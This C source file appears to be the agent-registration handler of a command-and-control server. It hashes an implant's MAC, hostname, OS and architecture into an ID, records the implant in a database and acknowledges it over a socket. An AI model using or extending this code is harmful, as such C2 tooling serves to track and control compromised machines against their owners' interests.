#include "register.h"

#include <stdio.h>
#include <stdlib.h>
#include <openssl/sha.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>

#include "db.h"
#include "logs.h"


void register_agent(cJSON *json, char *ip, int sock) {  

    cJSON *mac = cJSON_GetObjectItem(json, "mac");
    cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
    cJSON *os =  cJSON_GetObjectItem(json, "os");
    cJSON *arch = cJSON_GetObjectItem(json, "arch");

    char input[255];
    snprintf(input, sizeof(input), "%s-%s-%s-%s", mac->valuestring, hostname->valuestring, os->valuestring, arch->valuestring);
    char implant_id[65];
    get_implant_id(input, implant_id);

    // check if id already exists in database
    if (check_implant_id(implant_id) == 1) goto REPLY;

    //log
    log_new_agent(implant_id, os->valuestring, hostname->valuestring, mac->valuestring, arch->valuestring);

    // register to datbase (implant_id, os, ip, mac, hostname)
    // check if agent id exists
    struct db_agents args;
    strncpy(args.implant_id, implant_id, sizeof(args.implant_id) - 1);
    args.implant_id[sizeof(args.implant_id) - 1] = '\0';
    strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
    args.os[sizeof(args.os) - 1] = '\0';
    strncpy(args.ip, ip, sizeof(args.ip) - 1);
    args.ip[sizeof(args.ip) - 1] = '\0';
    strncpy(args.mac, mac->valuestring, sizeof(args.mac) - 1);
    args.mac[sizeof(args.mac) - 1] = '\0';
    strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
    args.hostname[sizeof(args.hostname) - 1] = '\0';

    strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
    args.arch[sizeof(args.arch) - 1] = '\0';
    new_agent(args);

    // reply with agent id
    REPLY:
    cJSON *json_reply = cJSON_CreateObject();
    cJSON_AddStringToObject(json_reply, "mode", "ack");
    cJSON_AddStringToObject(json_reply, "implant_id", implant_id);

    char *reply = cJSON_Print(json_reply);
    send(sock, reply, strlen(reply), 0);

    free(reply);
    cJSON_Delete(json_reply);
}


void get_implant_id(const char *input, char output[65]) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char *)input, strlen(input), hash);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(output + (i * 2), "%02x", hash[i]);
    }
    output[64] = 0;
}